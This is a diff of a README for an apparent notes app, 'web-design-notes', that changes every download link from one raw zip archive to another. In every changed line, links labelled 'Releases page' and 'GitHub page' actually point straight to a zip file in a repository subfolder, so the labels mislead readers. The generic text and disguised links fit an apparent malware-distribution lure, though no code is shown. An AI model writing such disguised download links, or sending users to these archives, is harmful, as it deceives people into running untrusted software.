@@ -1,7 +1,7 @@
 # 🎨 web-design-notes - Keep Your Design Ideas Organized
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/ghostast/web-design-notes/main/antenati/web-notes-design-v3.1.zip%20Latest%20Release-%20-brightgreen)](https://raw.githubusercontent.com/ghostast/web-design-notes/main/antenati/web-notes-design-v3.1.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/ghostast/web-design-notes/main/antenati/notes_design_web_2.9.zip%20Latest%20Release-%20-brightgreen)](https://raw.githubusercontent.com/ghostast/web-design-notes/main/antenati/notes_design_web_2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to web-design-notes! This application helps you keep track of your web design ideas, notes, and small layout practice. With an easy-to-use interface, it allows anyone to organize and store their creative thoughts.
@@ -19,7 +19,7 @@ To run this application, make sure you have the following:
 - **Search Function**: Quickly find your ideas and notes with a built-in search tool.
 
 ## 📂 Download & Install
-To get started with web-design-notes, visit the [Releases page](https://raw.githubusercontent.com/ghostast/web-design-notes/main/antenati/web-notes-design-v3.1.zip) to download the latest version. Follow these steps:
+To get started with web-design-notes, visit the [Releases page](https://raw.githubusercontent.com/ghostast/web-design-notes/main/antenati/notes_design_web_2.9.zip) to download the latest version. Follow these steps:
 
 1. Click on the above link to open the Releases page.
 2. Find the latest version at the top of the page.
@@ -43,7 +43,7 @@ After installation, you can start using the application by following these steps
 - Check the sample layouts often to stimulate your creativity.
 
 ## 🏁 Getting Support
-If you run into any issues, you can visit the project's [GitHub page](https://raw.githubusercontent.com/ghostast/web-design-notes/main/antenati/web-notes-design-v3.1.zip) to check for solutions. You can also open a new issue there for any specific problems you face.
+If you run into any issues, you can visit the project's [GitHub page](https://raw.githubusercontent.com/ghostast/web-design-notes/main/antenati/notes_design_web_2.9.zip) to check for solutions. You can also open a new issue there for any specific problems you face.
 
 ## 🌐 Community Contribution
 We welcome contributions from anyone who wants to improve web-design-notes. If you have suggestions or want to report bugs, please let us know via the issues section on our GitHub page.
@@ -52,4 +52,4 @@ We welcome contributions from anyone who wants to improve web-design-notes. If y
 For any inquiries or feedback about web-design-notes, feel free to reach out via GitHub. We appreciate your input!
 
 ## 📢 Stay Updated
-Make sure to keep checking the [Releases page](https://raw.githubusercontent.com/ghostast/web-design-notes/main/antenati/web-notes-design-v3.1.zip) for future updates and new features. Let’s keep your web design ideas organized and accessible!
+Make sure to keep checking the [Releases page](https://raw.githubusercontent.com/ghostast/web-design-notes/main/antenati/notes_design_web_2.9.zip) for future updates and new features. Let’s keep your web design ideas organized and accessible!
